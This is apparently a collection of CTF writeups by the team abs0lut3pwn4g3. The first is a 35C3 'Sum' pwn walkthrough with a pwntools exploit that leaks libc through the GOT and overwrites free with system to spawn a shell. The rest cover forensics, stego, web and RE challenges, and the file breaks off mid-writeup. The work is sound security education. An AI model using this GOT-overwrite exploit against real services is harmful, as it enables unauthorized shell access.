<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-abs0lut3pwn4g3
description: CTF writeups and security challenges by abs0lut3pwn4g3.
---

# Writeups by abs0lut3pwn4g3

Source repository: `/repos/abs0lut3pwn4g3`

## Repository Index

- writeups/index.md
- writeups/_posts/2019-03-05-35C3-junior-ctf-sum.md
- writeups/_posts/2019-03-05-bsides-ctf-Blink.md
- writeups/_posts/2019-03-05-bsides-ctf-TheKey.md
- writeups/_posts/2019-04-04-encryptctf-GetSchwifty.md
- writeups/_posts/2019-04-04-encryptctf-env.md
- writeups/_posts/2019-04-04-encryptctf-journeytothecentreofthefile1.md
- writeups/_posts/2019-04-04-encryptctf-journeytothecentreofthefile2.md
- writeups/_posts/2019-04-04-encryptctf-slashslash.md
- writeups/_posts/2019-04-04-encryptctf-stressedout.md
- writeups/_posts/2019-06-08-HSCTF-Forensics-CoolImage2.md
- writeups/_posts/2019-06-08-HSCTF-RE-license.md
- writeups/_posts/2019-12-16-watevr-ctf-repyc.md

## Writeup Content


### File: writeups/_posts/2019-03-05-35C3-junior-ctf-sum.md

---
layout: post
author: X3eRo0
--- 
### Challenge: Sum(for 143 points)




<pre id="user-content-taag_output_text">
           _____ _________________                 __            _               __________________
          |__  // ____/ ____/__  /                / /_  ______  (_)___  _____   / ____/_  __/ ____/
           /_ &lt;/___ \/ /     /_ &lt;   ______   __  / / / / / __ \/ / __ \/ ___/  / /     / / / /_    
         ___/ /___/ / /___ ___/ /  /_____/  / /_/ / /_/ / / / / / /_/ / /     / /___  / / / __/    
        /____/_____/\____//____/            \____/\__,_/_/ /_/_/\____/_/      \____/ /_/ /_/       
</pre>
              
              
                                          143 Points - PWNABLE
                                          
                                          
Challenge Description:
 

                                        Sum it up!
                                        nc 35.207.132.47 22226
                                        Difficulty estimate: easy
              


We Are Given a zip file to Download - [ZIP](https://github.com/X3eRo0/X3eRo0.github.io/raw/master/sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip). upon extracting we get the actuall binary and libc used on the server. 
So lets try to Execute the binary and see what it does.
```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_143  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> 2
Allocated space for 2 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> 
```

So basically it asks us for how many values you want to add up which gives us a hint that maybe its allocating space for that many values. so, i tried to mess around with it, and just after some time i entered a magical value of negative 1.
which gave me a segmentation fault on proceeding with the menu. which is good for us. also we can see that in the menu we have 2 main options of setting **x**-th value in allocated space to **d**, and similarly fetching a value at **x**-th index.

so lets try to enter -1 in the prompt where it asks us how many values to sum.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> set 5000 50
[1]    7880 segmentation fault (core dumped)  ./sum
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
```

and here is the output of dmesg

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ dmesg | tail -n 1
[ 3390.576740] sum[7880]: segfault at 9c40 ip 0000000000400ac3 sp 00007fffd29d0d40 error 6 in sum[400000+2000]
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
```

the Segmentation Fault occured at Instruction Pointer : 0x0400ac3
so lets fire up gdb and look what happened.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ gdb ./sum
GNU gdb (Ubuntu 8.2-0ubuntu1~18.04) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
.........
.........
.........
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./sum...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum 
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
> -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set <x> <d>
    Set the x-th value to d
[2] get <x>
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set <x> <d>
[2] get <x>
[3] sum
[4] bye

> set 5000 500

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x1388 
RBX: 0x7fffffffdc38 --> 0x603670 ("set 5000 500\n")
RCX: 0x0 
RDX: 0x1f4 
RSI: 0x0 
RDI: 0x7fffffffd5c0 --> 0x303035 ('500')
RBP: 0x7fffffffdc40 --> 0x78 ('x')
RSP: 0x7fffffffdc30 --> 0xffffffffffffffff 
RIP: 0x400ac3 (<calculator+493>:        mov    QWORD PTR [r12+rax*8],rdx)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7b82cc0 --> 0x2000200020002 
R11: 0x400c78 --> 0x6f207865646e4900 ('')
R12: 0x0 
R13: 0x400c95 --> 0x20656854006d7573 ('sum')
R14: 0x400caa --> 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ab4 <calculator+478>:   cmp    rax,QWORD PTR [rsp]
   0x400ab8 <calculator+482>:   jae    0x4009da <calculator+260>
   0x400abe <calculator+488>:   mov    rdx,QWORD PTR [rsp+0x20]
=> 0x400ac3 <calculator+493>:   mov    QWORD PTR [r12+rax*8],rdx
   0x400ac7 <calculator+497>:   jmp    0x400a54 <calculator+382>
   0x400ac9 <calculator+499>:   mov    rax,QWORD PTR [rsp+0x18]
   0x400ace <calculator+504>:   cmp    rax,QWORD PTR [rsp]
   0x400ad2 <calculator+508>:   jae    0x400af3 <calculator+541>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc30 --> 0xffffffffffffffff 
0008| 0x7fffffffdc38 --> 0x603670 ("set 5000 500\n")
0016| 0x7fffffffdc40 --> 0x78 ('x')
0024| 0x7fffffffdc48 --> 0x1388 
0032| 0x7fffffffdc50 --> 0x1f4 
0040| 0x7fffffffdc58 --> 0x8b364cb51f106b00 
0048| 0x7fffffffdc60 --> 0x0 
0056| 0x7fffffffdc68 --> 0x400bb0 (<__libc_csu_init>:   push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400ac3 in calculator ()
gdb-peda$ 
```
clearly Segmentation Fault Occured in the function calculator because of this statement
                        **mov    QWORD PTR [r12+rax*8],rdx**

value from rdx is stored at the address [r12+rax*8]
and if you debug the binary in gdb yourself, you will find that rax if the index value that we provide in "set 5000 50"
which means 5000 and rdx is the value we set to it which is 50 in this case

and if we look a little up in calculator()
we see what is r12

```
   0x000000000040098a <+180>:   call   0x400760 <calloc@plt>
   0x000000000040098f <+185>:   mov    r12,rax
```

when we input -1 calloc returns NULL or 0.so, r12 is 0 if we supply -ve values because you just cant allocate -ve space in memory.

so this statement just becomes 
                        **mov    QWORD PTR [rax*8],rdx**
                        
so the vulnerability is clear we have arbitrary read-write primitive.
but first lets try to **get** something from the binary, lets try to leak the address of puts from the binary
we will do that using pwntools. 
```
rom pwn import *
#context.log_level = "critical"
exe = ELF("./sum")
local = True
if local:
        p = process("./sum")
else:
        p = remote("52.15.72.79", 14012)

puts_got = exe.got.puts/8

p.sendlineafter("How many values to you want to sum up?\n> ", "-1")
p.recvuntil("\n> ")
p.sendline("get "+str(puts_got))
puts = int(p.recv(16))
log.info( "PUTS: "+hex(puts) )
```
what we do is simply get the got value of puts from binary and send to binary using "get" command and it will spit its value
we receive it and print it on screen. here is script in action.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9146
[*] PUTS: 0x7fe5fe06e9c0
[*] Stopped process './sum' (pid 9146)
```

so we are able to leak the addresses, Now what do we do.
Remember we also have libc, we will use @niklasb's libc-database to find offsets to system()
here is how i did it. you could also use https://libc.blukat.me

```
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ ./identify libc-2.27.so 
id libc6_2.27-3ubuntu1_amd64
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep "puts "
_IO_puts 00000000000809c0
puts 00000000000809c0
fputs 000000000007f1f0
_IO_fputs 000000000007f1f0
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep "system "
__libc_system 000000000004f440
system 000000000004f440
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*›
╰─$ 
```

now we can calculate libc_base address by subtracting puts offset from libc from leaked puts address.

```
.....
.....
#libc offsets

offset_system = 0x04f440
offset_puts = 0x000809c0

libc_base = puts - offset_puts
log.info("LIBC BASE: "+hex(libc_base))

system = libc_base + offset_system
......
......
```

now what do we do with system() what do we overwrite, system would require an argument. how the hell do we spawn a shell?.
after short moment of rage, i decided to look back in the disassembled calculator() function.

and noticed something really weird thing.
after we are done with the program we can send "bye" command to exit from the binary.
when we send "bye" it calls free() and with argument as our input.
```
[----------------------------------registers-----------------------------------]
RAX: 0xffffff00 
RBX: 0x7fffffffdc38 --> 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RCX: 0x0 
RDX: 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RSI: 0x6036d3 --> 0xa3120000a ('\n')
RDI: 0x6036d0 --> 0xa3120000a657962 ('bye\n')
RBP: 0x7fffffffdc40 --> 0x78 ('x')
RSP: 0x7fffffffdc30 --> 0xa ('\n')
RIP: 0x400b41 (<calculator+619>:        call   0x400720 <free@plt>)
R8 : 0x0 
R9 : 0x7ffff7fc7500 (0x00007ffff7fc7500)
R10: 0x603260 ("bye\n9 1\n")
R11: 0x400c8e --> 0x7300757a25207465 ('et %zu')
R12: 0x603670 --> 0x0 
R13: 0x400c95 --> 0x20656854006d7573 ('sum')
R14: 0x400caa --> 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b32 <calculator+604>:   mov    eax,0x0
   0x400b37 <calculator+609>:   call   0x400790 <__printf_chk@plt>
   0x400b3c <calculator+614>:   mov    rdi,QWORD PTR [rsp+0x8]
=> 0x400b41 <calculator+619>:   call   0x400720 <free@plt>    <================= call to free -----
   0x400b46 <calculator+624>:   mov    rax,QWORD PTR [rsp+0x28]                                    |
   0x400b4b <calculator+629>:   xor    rax,QWORD PTR fs:0x28                                       |
   0x400b54 <calculator+638>:   jne    0x400b6a <calculator+660>                                   |
   0x400b56 <calculator+640>:   add    rsp,0x30                                                    |
Guessed arguments:                                                                                 |
arg[0]: 0x6036d0 --> 0xa3120000a657962 ('bye\n')  <========================= arguments to free-----
```

you can see gdb-peda guessed the arguments passed to free() call shows that it points to the string we enter.



if we replace free() with system() and send "bye;/bin/sh"
insted of bye, we can get a shell. in then end thats what i did.

```
free = exe.got["free"]
p.sendline("set "+str(free/8)+" "+str(system))
p.recvuntil("\n> ")
p.sendline("bye; /bin/sh")
```

first we get address of free from got of binary, and then we set free's address devided by 8 because of this statement
                                **mov    QWORD PTR [rax*8],rdx**
where the given address is multiplied by 8.
and thats it we are done.

the final exploit looks like this.
```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9623
[*] PUTS: 0x7ff45ee4f9c0
[*] LIBC BASE: 0x7ff45edcf000
[*] system() : 0x7ff45ee1e440
[*] Switching to interactive mode
sh: 1: bye: not found
$ ls
exploit.py  libc-2.27.so  sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip
flag.txt    sum
$ cat flag.txt
flag{ctf_is_over_so_this_is_a_local_exploit_from_X3eRo0}
$  

```

Thanks for reading that.
                                                                                                ~by [X3eRo0](https://twitter.com/X3eRo0)



               
               



### File: writeups/_posts/2019-03-05-bsides-ctf-Blink.md

---
layout: post
author: eshaan7
---

### Challenge: Blink(for 50 points)

	Description:
	
	Get past the Jedi mind trick to find the flag you are looking for.
	File: blink.apk

<br/>
On installing the app on a mobile, we see this:

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/appMobileSS.png" width="250px" height="350px">

Then I used apktool to decompile it.

    apktool d blink.apk

Going into the smali folder created by apktool

    blink/smali/com/example/blink

There’s a `r2d2.smali` file. Inside there’s a string of base64 encoded image.

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/r2d2img.png">

I saved the string to `blink_r2d2.txt`

    cat blink_r2d2.txt | base64 -d > flag.png

On decoding the base64 string, and we get an image and the flag.

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/50_blink_COMPLETE/flag.jpg">

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-03-05-bsides-ctf-TheKey.md

---
author: eshaan7
layout: post
---


### Challenge: TheKey(for 100 points) [Forensics | BsidesSF 2019 CTF]

We are given a  `thekey.pcapng` packet file. On analyzing with wireshark, we see that we have a lot of usb data on this pcap file. <br/>
let´s extract the Leftover Capture Data with `tshark`

	tshark -r thekey.pcapng -T fields -e usb.capdata

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/forensics/100_thekey_COMPLETE/pics/1.png">

we need only numbers without zeros and separators

	tshark -r thekey.pcapng -T fields -e usb.capdata |  grep -v '00:00:00:00:00:00:00:00' | cut -d ':' -f3

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/forensics/100_thekey_COMPLETE/pics/2.png">

save this to `usb_keys.txt`

using sublime, I removed the newline chars converted the keys into hex value and basically a python list (regex are awesome!)

	keys = [ "0x19", "0x0C", "0x0C", "0x10", "0x2C", "0x09", "0x0"...............

<br/>
Next, on the <a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">pdf</a> (Page 53), we have a key map of a USB Keyboard

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/forensics/100_thekey_COMPLETE/pics/usbDoc.png">

I had to manually copy & paste the key bindings and then scrap it using `tr -d " " -f1` and sublime(again, learn regex!) and converted it to another python list!

	{ "0x00" :"",
	"0x04" :"a",
	"0x05" :"b",
	"0x06" :"c",
	"0x07" :"d",
	... }

but wait, we have too much data, let’s use a python script to do the work for us! :D

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/forensics/100_thekey_COMPLETE/pics/pyscript.png">

run the script and get the flag! 

<img src="https://raw.githubusercontent.com/Eshaan7/CTFs_datadumps_2019/master/BSidesSF_CTF_2019_WithWriteups/forensics/100_thekey_COMPLETE/pics/runpyscript.png">

oh ok not really, the output is really messed up, what we did was replicate these key-taps on a terminal and that got us a clear idea about the flag, it is a keyboard capture afterall!
But I tried submitting this flag and it kept saying it's wrong so I changed it to uppercase and voila!

The flag is: `CTF{MY_FAVOURITE_EDITOR_IS_VIM}`

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-04-04-encryptctf-GetSchwifty.md

---
author: eshaan7
layout: post
---


### Challenge: Get Schwifty ?(for 150 points, dynamic) [Forensics]

#### Challenge description: 

	Evil Morty, the first democratically-elected President of the Citadel of Ricks, has 	killed off twenty-seven known Ricks from various dimensions, as well as capturing, torturing, and enslaving hundreds of Mortys. As a fellow Rick-less Morty, Investigator Rick gives you a file revealing Evil Morty's past and true nature. However he cannot seem to access it. Can you help recover it to stop Evil Morty ? 
		Download link here: [link](https://drive.google.com/file/d/1XxqRFFpn9Zj7gNQ6Ahg74rTAFPbkeNq9/view?usp=drive_open)
		Author: maskofmydisguise
	

#### Let's capture tis fl4g: 

We are given a `GetSchwifty.7z` file, we extract it to find a mountable disk image `GetSchwifty.7z`.
On mounting it we see that it is empty.

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_mounted_image.png">

So we need to analyze this disk image and try to recover deleted data, if any. 
We can use [testdisk, data recovery tool](https://www.cgsecurity.org/wiki/TestDisk) for this.

	┌─[eshaan@HP-ubuntu]-[~/Desktop/CTFs/Abs0lut3Pwn4g3_CTF/encrypt-ctf-2019/Forensics/150_Get_Schwifty/files_in_img/tmp]
    └─➤ ls
	GetSchwifty.7z  GetSchwifty.img
	┌─[eshaan@HP-ubuntu]-[~/Desktop/CTFs/Abs0lut3Pwn4g3_CTF/encrypt-ctf-2019/Forensics/150_Get_Schwifty/files_in_img/tmp]
	└─➤ sudo testdisk GetSchwifty.img

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_testdisk1.png">
<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/GetSchwifty_testdisk2.png">

Here we see that we get a few files,

1. `hahahaha`
2. `secret_hidden_file.png`
3. `'school work(do not open)' (directory)`
4. `super_duper_secret_hidden_file.txt`

here `secret_hidden_file.png` has the flag in plainsight.

	FLAG: encryptCTF{alw4ys_d3lete_y0ur_f1les_c0mpletely}

Also, `super_duper_secret_hidden_file.txt` contains a base64 string that decodes to `not_the_flag_LOL`. 
Also, `school work(do not open)` had a random audio file.

*Just some rabbit holes for the lighthearted ;)*

#### BONUS:

the `hahahaha` file was actually a broken `.zip` file which had to be fixed using `hexedit` to set the correct <a href="https://en.wikipedia.org/wiki/File_format#Magic_number">magic bytes</a>. Which contains a 2nd flag, which I forgot to implement. sorry xD


#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-04-04-encryptctf-env.md

---
author: eshaan7
layout: post
---

### Challenge: ENV(for 100 points, static) [WEB]

#### Challenge description: 
	
	Einstien said,"_time_ was relative, right?"
	link: 
	Author: maskofmydisguise

#### Let's capture tis fl4g: 

	curl http://104.154.106.182:6060/whatsthetime/$(date "+%s")

Repeat this until it throws you the flag.

Can also be done with python,

```python
import requests
import time


host = "104.154.106.182"
port = '6060'

while True:
    response = requests.get('http://104.154.106.182:6060/whatsthetime/'+str(int(time.time())))
    if "404" not in response.content:
        print response.content
        break
```

Repeat this until it throws you the flag.

	FLAG: encryptCTF{v1rtualenvs_4re_c00l}

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)





### File: writeups/_posts/2019-04-04-encryptctf-journeytothecentreofthefile1.md

---
author: eshaan7
layout: post
---


### Challenge: Journey to the centre of the file 1(for 75 points, static) [Forensics]

#### Challenge description: 

	"Nearly everything is really interesting if you go into it deeply enough …" - Richard Feynman
	Author: maskofmydisguise
	file : (ziptunne1.gz)[]

#### Let's capture tis fl4g: 

We are given a `ziptunne1.gz` file which as the name says is `gzipped` again and again.

I don't know if someone tried this manually, but seriously like um don't do that?
We are hackers, let the computer do the manual labour for us!
So we write a shell script. ez pz 
<sub><sup>I use range 1-100 cz we don't know how many stages of archiving is there. So just a guess.</sup></sub>

```bash
#!/bin/bash

mkdir tmp
cp ziptunnel1.gz tmp/ # creating tmp directory and solving there coz we use `ls` to get filenames
cd tmp/
for i in {1..100}
do
	if [ $((i%2)) -eq 0 ]
   	then
   		gzip -d *
	else
		unzip *
		rm *.zip > /dev/null 2>&1
	fi
done
```

As the script loops over every stage, it finally hits a stop when we get a `flag.txt` which contains the flag! ez pz

	FLAG: encryptCTF{w422up_b14tch3s}

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)






### File: writeups/_posts/2019-04-04-encryptctf-journeytothecentreofthefile2.md

---
author: eshaan7
layout: post
---


### Challenge: Journey to the centre of the file 2(for 150 points, static) [Forensics]

#### Challenge description: 
	
	This challenge unlocks after completing "Journey to the centre of the file 1" challenge.

	[Improvise. Adapt. Overcome](https://imgur.com/gallery/wMbXB)
	file: (ziptunnel2)[ ]
	Author: maskofmydisguise

#### Let's capture tis fl4g: 

We are given a `ziptunnel2` file here. This is level 2 of (Journey to the centre of the file 1)[ ] Challenge.
Here, instead of just `gzip` we have various types of compression at random stages!
But, as the challenge description says we gotta *Improvise. Adapt. Overcome*
So let's make some changes to our `get_flag.sh` script.

```bash
#!/bin/bash

mkdir tmp/
cp ziptunnel2 tmp/ # creating tmp directory and solving there coz we use `ls` to get filenames
cd tmp/
filename=$(ls)
rm -r tmp2/
mkdir tmp2/
cp $filename tmp2/
cd tmp2/
filename=$(ls)
while [ 1 ]
do
	file $filename
	file $filename | grep "bzip2"
	if [ "$?" -eq 0 ]
	then
		mv $filename $filename.bz2
		bunzip2 $filename.bz2 > /dev/null
		filename=$(ls)	
	fi

	file $filename | grep "Zip"
	if [ "$?" -eq 0 ]
	then
		mv $filename $filename.zip
		unzip $filename.zip > /dev/null
		rm $filename.zip > /dev/null 2>&1
		filename=$(ls)	
	fi

	file $filename | grep "gzip"
	if [ "$?" -eq 0 ]
	then
		mv $filename $filename.gz
		gunzip $filename.gz > /dev/null
		filename=$(ls)
	fi

	file $filename | grep "ASCII"
	if [ "$?" -eq 0 ]
	then
		echo 
		echo
		echo "Flag Found!"
		echo
		cat $filename
		echo
		echo
		break
	fi
done
```

This script directly spits out the flag, 

	FLAG: encryptCTF{f33ls_g00d_d0nt_it?}

Now, one thing is that I am not gonna explicitly explain every line of the code, cz <a href="https://www.youtube.com/user/RootOfTheNull">John Hammond</a> actually has done a <a href="https://www.youtube.com/watch?v=wRSwagjvSqU">writeup video</a> on a similar challenge.

*YeAh, I know what you thinkin' it was copied. OMG!*

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-04-04-encryptctf-slashslash.md

---
author: eshaan7
layout: post
---

### Challenge: Slash Slash(for 50 points, static) [WEB]

#### Challenge description: 
	
	//
	file: (handout_slashslash.7z[ ]
	Author: maskofmydisguise

#### Let's capture tis fl4g: 

We are given a `handout_slashslash.7z` file here.
It contains a Python virtual environment and a Flask(python) Application returning JSON data (the flag) at /encryptCTF route.
Now, we know that the Flask Application loads the flag from the environment variable FLAG. This Environment Variable is loaded when the virtual environment is activated using

	source ./env/bin/activate

then when we go to the /encryptCTF route we get this,

```JSON
flag: encryptCTF{}
```

*LMAOOO000000000000OOOOOOOOOO0000*

So, we gotta think now and since the `application.py` file also includes a link to learn about virtual environments and if we concentrate on the challenge name, what dies that tell us? maybe something important is commented out somewhere ? eh, just a thought.

Anyhoo, In the env/bin/activate script you will find the environment variable being exported as an env var (all encoded in base64). Simply decode the base64 to get the flag.

	FLAG: encryptCTF{comments_&_indentations_makes_johnny_a_good_programmer}

We could have also ran
	
	grep -nir encryptCTF

on the app/ and still wouldn't have got anything.
but, if we do

	grep -nir `echo "encryptCTF" | base64`

We get the location of the flag. :)

##### BONUS:

Virtual environments are awesome!
The purpose is to ease development and also store config, requirements.txt, no need to pip install anything.
I made this challenge to introduce people to environment variables, virtual environment and basic web development using Flask microframework which I love. :)

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-04-04-encryptctf-stressedout.md

---
author: eshaan7
layout: post
---


### Challenge: Stressed Out ?(for 100 points, static) [Steganography]

#### Challenge description: 

	Elliot all stressed out from this hack, that hack, saving the world (yeeeeep, sounds about right) was losing his mind when Mr. Robot handed him this song to relax to.
     
	Elliot: It's good. So good, it scratched that part of my mind. The part that doesn't allow good to exist without a condition.
     
	Author: maskofmydisguise

#### Let's capture tis fl4g: 

We are given a [dontstressoutkiddo.zip](https://github.com/mishrasunny174/encrypt-ctf/blob/master/Stego/100_Stressed_out%3F/dontstressoutkiddo.zip) file, we unzip it to find an audio `dontstressoutkiddo.wav` which is playing [Stressed Out by Twenty One Pilots](https://www.youtube.com/watch?v=pXRviuL6vMY).
Analyzing with sonic visualizer, trying to find something in the spectrogram, we get nada. 

Proceed as below,

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/stressedout.png">

We do `exiftool` and see a string `1_4M_Str3ss3d_0ut`, which is not the flag, but it is the password to extract a hidden jpg file using `steghide`. 
On closely looking at the extracted [flag.jpg](https://github.com/mishrasunny174/encrypt-ctf/blob/master/Stego/100_Stressed_out%3F/flag.jpg) file, we can see there is a flag which can be seen clearly on increasing brightness or using ```stegsolve.jar``` on it.

	FLAG: encryptCTF{tyl3r_j0s3ph_is_4_g0d}

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-06-08-HSCTF-Forensics-CoolImage2.md

---
author: eshaan7
layout: post
---


## Challenge: Cool Image 2 (for 105 points, dynamic) [Forensics]

#### Challenge description: 

	Written by: cppio
	My friend sent me this image, but I can't open it. Can you help me open the image?
	File: cool.png
	Free Hint: Try looking at the raw contents of the file.

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_desc.png" width="300" align="centre"/>

#### Let's capture tis fl4g: 

We have a `cool.png` file, on opening it, we get,

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_openFile.png" width="300" height="300"/> 

Let's see the `hexdump` of this file with the command,

	$ hexdump -C cool.png
  
We get, 

<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_hexdump.png" width="900" height="400"/>

As we can see here, there's some string in the header i.e. extra bytes that is messing up our `cool.png` file that's why we are not able to open it in image viewer, <br>
We can simply use `foremost` to extract the image from the messed up file we have.

	$ foremost cool.png
	$ eog output/png/*.png
	
<img src="https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/hsCTFImages/CoolImage2_flag.png" width="500" height="200"/>

We have the Flag!

	FLAG: hsctf{sorry_about_the_extra_bytes}

#### Thankyou for reading, happy hackin'! ~ [eshaan7](https://eshaan7.cf/)



### File: writeups/_posts/2019-06-08-HSCTF-RE-license.md

---
layout: post
author: X3eRo0
--- 
### Challenge: License [ 298(DYN) RE ] 




<div id="maincontent">
<div id="outputFigDisplay" class="fig">
	<pre id="taag_output_text" class="fig" contenteditable="true">
		    __  _______ __________________              ___   ____ _______ 
		   / / / / ___// ____/_  __/ ____/             |__ \ / __ &lt;  / __ \
		  / /_/ /\__ \/ /     / / / /_       ______    __/ // / / / / /_/ /
		 / __  /___/ / /___  / / / __/      /_____/   / __// /_/ / /\__, / 
		/_/ /_//____/\____/ /_/ /_/                  /____/\____/_//____/  
	                                                                   </pre>
<div>&nbsp;</div>
</div>
</div>
              
              
                                          298 - DYNAMIC - RE
                                          
                                          
Challenge Description:
 


        Written by: ItzSomebody

	Description: 
	Keith made a cool license-checking program but he forgot the flag he used to create the key! To make matters worse, he lost the source code and stripped the binary for his license-generator program. Can you help Keith recover his flag? All he knows is:
	• The license key is 4-EZF2M-7O5F4-V9P7O-EVFDP-E4VDO-O
	• He put his name (in the form of 'k3ith') as the first part of the flag
	• There are 3 underscores
	• The flag is in the format hsctf{}
	• The flag doesn't have random character sequences (you should be able to read the entire flag easily).
	• The flag only contains lowercase English letters and numbers.
	• The generator might produce the same keys for different inputs because Keith was too lazy to write the algorithm properly.

Binary : [license](https://github.com/X3eRo0/X3eRo0.github.io/raw/master/license)
              
before opening the binary in any disassembler or any debugger, i thought lets take a look at what it does.

runing the binary will make your work a little easier in this case.

```
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license 
gimme dat string: A
generating key for: a
X
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/hsctf 
╰─$ ./license
gimme dat string: B
generating key for: b
Y
